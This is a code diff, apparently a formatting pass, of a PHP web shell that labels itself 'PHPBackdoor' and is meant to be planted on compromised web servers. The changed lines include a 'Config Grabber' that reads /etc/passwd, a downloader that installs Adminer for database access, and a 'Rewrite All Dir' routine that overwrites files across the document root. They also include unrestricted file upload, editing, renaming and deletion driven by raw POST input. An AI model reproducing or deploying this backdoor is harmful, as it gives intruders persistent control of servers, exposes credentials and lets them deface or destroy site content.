+                      '<div class="jqx-alert" id="alert_container">' +
+                      '<div id="alert_title"></div>' +
+                      '<div id="alert_content">' +
+                      '<div id="message"></div>' +
+                      '<input type="button" value="OK" id="alert_button"/>' +
+                      '</div>' +
+                      '</div>');
+            $("#alert_title").text(title);
+            $("#alert_title").addClass('jqx-alert-header');
+            $("#alert_content").addClass('jqx-alert-content');
+            $("#message").text(msg);
+            $("#alert_button").click(function () {
+                jqxAlert._hide();
+            });
+            jqxAlert._setPosition();
+        },
+        _hide: function () {
+            $("#alert_container").remove();
+            jqxAlert._handleOverlay('hide');
+        },
+        _handleOverlay: function (status) {
+            switch (status) {
+                case 'show':
+                jqxAlert._handleOverlay('hide');
+                $("BODY").append('<div id="alert_overlay"></div>');
+                $("#alert_overlay").css({
+                    position: 'absolute',
+                    zIndex: 99998,
+                    top: '0px',
+                    left: '0px',
+                    width: '100%',
+                    height: $(document).height(),
+                    background: jqxAlert.overlayColor,
+                    opacity: jqxAlert.overlayOpacity
+                });
+                break;
+           case 'hide':
+                $("#alert_overlay").remove();
+                break;
+            }
+        },
+        _setPosition: function () {
+            var top = (($(window).height() / 2) - ($("#alert_container").outerHeight() / 2)) + jqxAlert.top;
+            var left = (($(window).width() / 2) - ($("#alert_container").outerWidth() / 2)) + jqxAlert.left;
+            if (top < 0) {
+                top = 0;
+            }
+            if (left < 0) {
+                left = 0;
+            }
+            $("#alert_container").css({
+                top: top + 'px',
+                left: left + 'px'
+            });
+            $("#alert_overlay").height($(document).height());
+        }
+    }
 </script>
 <center>
 <div class="files">
@@ -1763,14 +1935,13 @@ function filterTable() {
     switch (@$_POST['action']) {
         case 'delete':
             if (XN::delete($_POST['file'])) {
-                alert("".basename($_POST['file'])." Deleted");
+                alert("" . basename($_POST['file']) . " Deleted");
             } else {
                 alert("Permission Danied");
             }
             break;
         case 'info':
-            head('Server Info', getcwd(), 'hidden');
-            ?>
+            head('Server Info', getcwd(), 'hidden'); ?>
             <div class="info">
                 <table>
                     <tr>
@@ -1860,44 +2031,48 @@ function filterTable() {
             <?php
             exit();
             break;
+
         case 'backup':
-            if (XN::save($_POST['file'].".bak", file_get_contents($_POST['file']))) {
+            if (
+                XN::save(
+                    $_POST['file'] . ".bak",
+                    file_get_contents($_POST['file'])
+                )
+            ) {
                 alert('failed');
             } else {
-                alert("".basename($_POST['file'])." has been backup !");
+                alert("" . basename($_POST['file']) . " has been backup !");
             }
             break;
         case 'adminer':
             head('Adminer', getcwd(), 'hidden');
-            if (file_exists('adminer.php')) {
-                ?>
+            if (file_exists('adminer.php')) { ?>
                 <div class="adminer">
                     <a href="adminer.php" target="_blank">Login Adminer</a>
                 </div>
-                <?php
-            } else {
-                if (XN::adminer('https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php', 'adminer.php')) {
-                    ?>
+                <?php } else {if (
+                    XN::adminer(
+                        'https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php',
+                        'adminer.php'
+                    )
+                ) { ?>
                     <div class="adminer">
                         <span>
                             Successfully created Adminer.php
                         </span><br><br>
                         <a href="adminer.php" target="_blank">Login Adminer</a>
                     </div>
-                    <?php
-                }
-            }
+                    <?php }}
             exit();
             break;
         case 'config':
-            head('Config Grabber', getcwd(), 'hidden');
-            ?>
+            head('Config Grabber', getcwd(), 'hidden'); ?>
             <div class="config">
                 <table>
                     <form method="post">
                         <tr>
                             <td>
-                                <textarea name="passwd"><?= include('/etc/passwd') ?></textarea>
+                                <textarea name="passwd"><?= include '/etc/passwd' ?></textarea>
                             </td>
                         </tr>
                         <tr>
@@ -1910,7 +2085,9 @@ function filterTable() {
                 </table>
             </div>
             <?php
-            if (XN::OS() == 'Windows') die(alert('Just for Linux server'));
+            if (XN::OS() == 'Windows') {
+                die(alert('Just for Linux server'));
+            }
             if (isset($_POST['grab'])) {
                 if (XN::config($_POST['passwd'])) {
                     alert("failed");
@@ -1920,15 +2097,17 @@ function filterTable() {
             }
             exit();
             break;
+
         case 'rewrite':
-            head('Rewrite All Dir', getcwd(), 'hidden');
-            ?>
+            head('Rewrite All Dir', getcwd(), 'hidden'); ?>
             <div class="rewrite">
                 <table>
                     <form method="post">
                         <tr>
                             <td>
-                                <input type="text" name="dir" value="<?= $_SERVER['DOCUMENT_ROOT'] ?>">
+                                <input type="text" name="dir" value="<?= $_SERVER[
+                                    'DOCUMENT_ROOT'
+                                ] ?>">
                             </td>
                         </tr>
                         <tr>
@@ -1949,31 +2128,34 @@ function filterTable() {
                         </tr>
                     </form>
                 </table>
-                <?php
-                if (isset($_POST['rewrite'])) {
-                    for ($i=0; $i < count($_POST['ext']) ; $i++) { 
-                    $plod = explode(" ", $_POST['ext'][$i]);
-                    foreach ($plod as $data) {
-                        if ($data) { ?>
+                <?php if (isset($_POST['rewrite'])) {
+                    for ($i = 0; $i < count($_POST['ext']); $i++) {
+                        $plod = explode(" ", $_POST['ext'][$i]);
+                        foreach ($plod as $data) {
+                            if ($data) { ?>
                             <tr>
                                 <td>
                                     <b><?= $data ?></b>
                                 </td>
                             </tr>
-                            <?php XN::rewrite($_POST['dir'], $data, $_POST['text']);
-                            }
+                            <?php XN::rewrite(
+                                $_POST['dir'],
+                                $data,
+                                $_POST['text']
+                            );}
                         }
                     }
-                }
-                ?>
+                } ?>
                 </div>
                 <?php
-            exit();
-            break;
+                exit();
+                break;
+
         case 'adddir':
+
             if (isset($_POST['adddir'])) {
                 $dirname = $_POST['dirname'];
-                for ($i=0; $i < count($dirname) ; $i++) { 
+                for ($i = 0; $i < count($dirname); $i++) {
                     $explode = explode(' ', $dirname[$i]);
                     foreach ($explode as $value) {
                         if (XN::addfolder($value)) {
@@ -2006,7 +2188,9 @@ function filterTable() {
             <?php
             exit();
             break;
+
         case 'addfile':
+
             if (isset($_POST['addfile'])) {
                 XN::addfile($_POST['filename'], $_POST['data']);
             }
@@ -2043,9 +2227,9 @@ function filterTable() {
             <?php
             exit();
             break;
+
         case 'upload':
-            head('Upload', getcwd(), 'hidden');
-            ?>
+            head('Upload', getcwd(), 'hidden'); ?>
             <div class="upload">
                 <table>
                     <form method="post" enctype="multipart/form-data">
@@ -2064,24 +2248,36 @@ function filterTable() {
             <?php
             if (isset($_POST['upload'])) {
                 $files = count($_FILES['file']['tmp_name']);
-                for ($i=0; $i < $files ; $i++) {
-                    if (copy($_FILES['file']['tmp_name'][$i], $_FILES['file']['name'][$i])) { ?>
+                for ($i = 0; $i < $files; $i++) {
+                    if (
+                        copy(
+                            $_FILES['file']['tmp_name'][$i],
+                            $_FILES['file']['name'][$i]
+                        )
+                    ) { ?>
                         <?= $_FILES['file']['name'][$i] ?>
-                    <?php } else {
-                        alert('Upload failed !');
-                    }
+                    <?php } else {alert('Upload failed !');}
                 }
             }
             exit();
             break;
+
         case 'rename':
-            if (@rename($_POST['file'], getcwd() . DIRECTORY_SEPARATOR . $_POST['newname'])) {
-                print("<script>window.location='?x=".getcwd()."'</script>");
+            if (
+                @rename(
+                    $_POST['file'],
+                    getcwd() . DIRECTORY_SEPARATOR . $_POST['newname']
+                )
+            ) {
+                print "<script>window.location='?x=" . getcwd() . "'</script>";
             } else {
-                print("<script>window.location='?x=".getcwd()."&failed=Rename'</script>");
+                print "<script>window.location='?x=" .
+                    getcwd() .
+                    "&failed=Rename'</script>";
             }
             exit();
         case 'edit':
+
             if (isset($_POST['save'])) {
                 if (XN::save($_POST['file'], $_POST['data'])) {
                     alert("Permission Danied");
@@ -2100,7 +2296,11 @@ function filterTable() {
                         <td>:</td>
                         <td>
                             <div class="editname">
-                                <?= XN::wr(basename($_POST['file']), basename($_POST['file']), 2) ?>
+                                <?= XN::wr(
+                                    basename($_POST['file']),
+                                    basename($_POST['file']),
+                                    2
+                                ) ?>
                             </div>
                         </td>
                     </tr>
@@ -2130,19 +2330,25 @@ function filterTable() {
                                 <button name="action" value="rename">Rename</button>
                                 <button name="action" value="backup">Backup</button>
                             </td>
-                            <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+                            <input type="hidden" name="file" value="<?= $_POST[
+                                'file'
+                            ] ?>">
                         </form>
                     </tr>
                     <form method="post">
                         <tr>
                             <td colspan="3">
-                                <textarea name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
+                                <textarea name="data"><?= htmlspecialchars(
+                                    file_get_contents($_POST['file'])
+                                ) ?></textarea>
                             </td>
                         </tr>
                         <tr>
                             <td colspan="3">
                                 <input type="submit" name="save" value="SAVE">
-                                <input type="hidden" name="file" value="<?= $_POST['file'] ?>">
+                                <input type="hidden" name="file" value="<?= $_POST[
+                                    'file'
+                                ] ?>">
                                 <input type="hidden" name="action" value="edit">
                             </td>
                         </tr>
@@ -2150,11 +2356,12 @@ function filterTable() {
                 </table>
             </div>
             <?php
-            exit;
+            exit();
             break;
+
     }
     if (@$_GET['failed']) {
-        alert("".$_GET['failed']." failed");
+        alert("" . $_GET['failed'] . " failed");
     }
     head(basename(getcwd()), dirname(getcwd()));
     ?>
@@ -2162,19 +2369,20 @@ function filterTable() {
         <span class="title">
             PHPBackdoor
         </span>
-        <br><span>Total : <?= XN::hdd('total') ?></span> <span>|</span> 
-        <span>Free : <?= XN::hdd('free') ?></span> <span>|</span> 
+        <br><span>Total : <?= XN::hdd('total') ?></span> <span>|</span>
+        <span>Free : <?= XN::hdd('free') ?></span> <span>|</span>
         <span>Used : <?= XN::hdd('used') ?></span>
     </div>
     <div class="table">
     <table id="myTable">
         <?php
-        foreach (XN::files('dir') as $dir) { 
-            ?>
+        foreach (XN::files('dir') as $dir) { ?>
             <tr>
                 <td class="border1 hover">
                     <div class="block">
-                        <a href="?x=<?= $dir['name'] ?>" title="<?= $dir['names'] ?>">
+                        <a href="?x=<?= $dir['name'] ?>" title="<?= $dir[
+    'names'
+] ?>">
                             <div class="img">
                                 <img src="https://image.flaticon.com/icons/svg/715/715676.svg">
                             </div>
@@ -2185,8 +2393,11 @@ function filterTable() {
                                         <?= $dir['size'] ?>
                                     </div>
                                     <div class="dir-perms">
-                                        <?= XN::wr($dir['name'], 
-                                        XN::perms($dir['name']), 2) ?>
+                                        <?= XN::wr(
+                                            $dir['name'],
+                                            XN::perms($dir['name']),
+                                            2
+                                        ) ?>
                                     </div>
                                     <div class="dir-time">
                                         <?= $dir['ftime'] ?>
@@ -2212,24 +2423,34 @@ function filterTable() {
                                     <button name="action" value="delete">Delete</button>
                                 </li>
                                 <li>
-                                    <a href="#rename<?= XN::replace($dir['names']) ?>" rel="modal:open">Rename</a>
+                                    <a href="#rename<?= XN::replace(
+                                        $dir['names']
+                                    ) ?>" rel="modal:open">Rename</a>
                                 </li>
-                                <input type="hidden" name="file" value="<?= $dir['name'] ?>">
+                                <input type="hidden" name="file" value="<?= $dir[
+                                    'name'
+                                ] ?>">
                             </form>
                         </ul>
                     </nav>
                     <!-- Action Rename -->
-                    <div id="rename<?= XN::replace($dir['names']) ?>" class="modal modal-rename">
+                    <div id="rename<?= XN::replace(
+                        $dir['names']
+                    ) ?>" class="modal modal-rename">
                         <div class="rename">
                             <h2>Rename</h2>
                             <form method="post" action="?x=<?= getcwd() ?>">
                                 <div>
-                                    <input type="text" name="newname" value="<?= $dir['names'] ?>">
+                                    <input type="text" name="newname" value="<?= $dir[
+                                        'names'
+                                    ] ?>">
                                 </div>
                                 <div>
                                     <button name="action" value="rename">Rename</button>
                                 </div>
-                                <input type="hidden" name="file" value="<?= $dir['name'] ?>">
+                                <input type="hidden" name="file" value="<?= $dir[
+                                    'name'
+                                ] ?>">
                             </form>
                         </div>
                     </div>
@@ -2251,8 +2472,11 @@ function filterTable() {
                                         <?= $file['size'] ?>
                                     </div>
                                     <div class="file-perms">
-                                        <?= XN::wr($file['name'], 
-                                        XN::perms($file['name']), 2) ?>
+                                        <?= XN::wr(
+                                            $file['name'],
+                                            XN::perms($file['name']),
+                                            2
+                                        ) ?>
                                     </div>
                                     <div class="file-time">
                                         <?= $file['ftime'] ?>
@@ -2275,24 +2499,43 @@ function filterTable() {
                         <ul class="dropdown">
                             <form method="post" action="?x=<?= getcwd() ?>">
                                 <?php
-                                $rep = str_replace(array(' ', '.', ':', '-' , '(', ')'), '', $file['names']);
+                                $rep = str_replace(
+                                    [' ', '.', ':', '-', '(', ')'],
+                                    '',
+                                    $file['names']
+                                );
                                 switch (XN::getext($file['name'])) {
                                     case 'mp4':
                                     case 'mp3':
-                                    switch (XN::getext($file['name'])) {
-                                        case 'mp3':
-                                            $result = str_replace('mp3', 'Audio', XN::getext($file['name']));
-                                            break;
-                                        case 'mp4':
-                                            $result = str_replace('mp4', 'Video', XN::getext($file['name']));
-                                            break;
-                                    }
-                                        ?>
+                                        switch (XN::getext($file['name'])) {
+                                            case 'mp3':
+                                                $result = str_replace(
+                                                    'mp3',
+                                                    'Audio',
+                                                    XN::getext($file['name'])
+                                                );
+                                                break;
+                                            case 'mp4':
+                                                $result = str_replace(
+                                                    'mp4',
+                                                    'Video',
+                                                    XN::getext($file['name'])
+                                                );
+                                                break;
+                                        } ?>
                                         <li>
                                             <a href="#ex1<?= $rep ?>" rel="modal:open">Play</a>
                                             <div id="ex1<?= $rep ?>" class="modal">
                                                 <<?= $result ?> controls>
-                                                    <source src="<?= str_replace($_SERVER['DOCUMENT_ROOT'], '', $file["name"]) ?>" type="<?= $result ?>/<?= XN::getext($file['name']) ?>">
+                                                    <source src="<?= str_replace(
+                                                        $_SERVER[
+                                                            'DOCUMENT_ROOT'
+                                                        ],
+                                                        '',
+                                                        $file["name"]
+                                                    ) ?>" type="<?= $result ?>/<?= XN::getext(
+    $file['name']
+) ?>">
                                                 </<?= $result ?>>
                                             </div>
                                         </li>
@@ -2300,12 +2543,12 @@ function filterTable() {
                                             <button name="action" value="delete">Delete</button>
                                         </li>
                                         <li>
-                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
+                                            <a href="#rename<?= XN::replace(
+                                                $file['names']
+                                            ) ?>" rel="modal:open">Rename</a>
                                         </li>
-                                        <?php
-                                        break;
-                                    case 'zip':
-                                        ?>
+                                        <?php break;
+                                    case 'zip': ?>
                                         <li>
                                             <button>Unzip</button>
                                         </li>
@@ -2313,34 +2556,35 @@ function filterTable() {
                                             <button name="action" value="delete">Delete</button>
                                         </li>
                                         <li>
-                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
+                                            <a href="#rename<?= XN::replace(
+                                                $file['names']
+                                            ) ?>" rel="modal:open">Rename</a>
                                         </li>
-                                        <?php
-                                        break;
-                                    case 'jpg':
+                                        <?php break;case 'jpg':
                                     case 'png':
                                     case 'gif':
                                     case 'jpeg':
                                     case 'ico':
-                                    case 'webp':
-                                        ?>
+                                    case 'webp': ?>
                                         <li>
                                             <a href="#ex1<?= $rep ?>" rel="modal:open">Preview</a>
                                             <div id="ex1<?= $rep ?>" class="modal">
-                                                <img src="<?= str_replace($_SERVER['DOCUMENT_ROOT'], '', $file['name']) ?>">
+                                                <img src="<?= str_replace(
+                                                    $_SERVER['DOCUMENT_ROOT'],
+                                                    '',
+                                                    $file['name']
+                                                ) ?>">
                                             </div>
                                         </li>
                                         <li>
                                             <button name="action" value="delete">Delete</button>
                                         </li>
                                         <li>
-                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
+                                            <a href="#rename<?= XN::replace(
+                                                $file['names']
+                                            ) ?>" rel="modal:open">Rename</a>
                                         </li>
-                                        <?php
-                                        break;
-                                    
-                                    default:
-                                        ?>
+                                        <?php break;default: ?>
                                         <li>
                                             <button name="action" value="edit">Edit</button>
                                         </li>
@@ -2348,31 +2592,39 @@ function filterTable() {
                                             <button name="action" value="delete">Delete</button>
                                         </li>
                                         <li>
-                                            <a href="#rename<?= XN::replace($file['names']) ?>" rel="modal:open">Rename</a>
+                                            <a href="#rename<?= XN::replace(
+                                                $file['names']
+                                            ) ?>" rel="modal:open">Rename</a>
                                         </li>
                                         <li>
                                             <button name="action" value="backup">Backup</button>
                                         </li>
-                                        <?php
-                                        break;
-                                }
+                                        <?php break;}
                                 ?>
-                                <input type="hidden" name="file" value="<?= $file['name'] ?>">
+                                <input type="hidden" name="file" value="<?= $file[
+                                    'name'
+                                ] ?>">
                             </form>
                         </ul>
                     </nav>
                     <!-- Action Rename -->
-                    <div id="rename<?= XN::replace($file['names']) ?>" class="modal modal-rename">
+                    <div id="rename<?= XN::replace(
+                        $file['names']
+                    ) ?>" class="modal modal-rename">
                         <div class="rename">
                             <h2>Rename</h2>
                             <form method="post" action="?x=<?= getcwd() ?>">
                                 <div>
-                                    <input type="text" name="newname" value="<?= $file['names'] ?>">
+                                    <input type="text" name="newname" value="<?= $file[
+                                        'names'
+                                    ] ?>">
                                 </div>
                                 <div>
                                     <button name="action" value="rename">Rename</button>
                                 </div>
-                                <input type="hidden" name="file" value="<?= $file['name'] ?>">
+                                <input type="hidden" name="file" value="<?= $file[
+                                    'name'
+                                ] ?>">
                             </form>
                         </div>
                     </div>
